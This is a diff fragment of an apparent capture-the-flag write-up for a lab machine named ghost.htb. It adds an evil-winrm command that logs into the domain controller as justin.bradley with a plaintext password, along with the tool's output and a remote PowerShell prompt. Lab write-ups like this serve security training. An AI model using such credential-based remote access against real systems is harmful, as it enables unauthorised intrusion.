@@ -829,5 +829,21 @@ This user is part of remote management users!
 # Access over WINRM as `justin.bradley`
 
 ```python
-
+evil-winrm -i dc01.ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$'                  
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\justin.bradley\Documents>
 ```
+
+
+
+# Enumeration as `justin.bradley`
+
+![](Pasted%20image%2020260828182211.png)
+
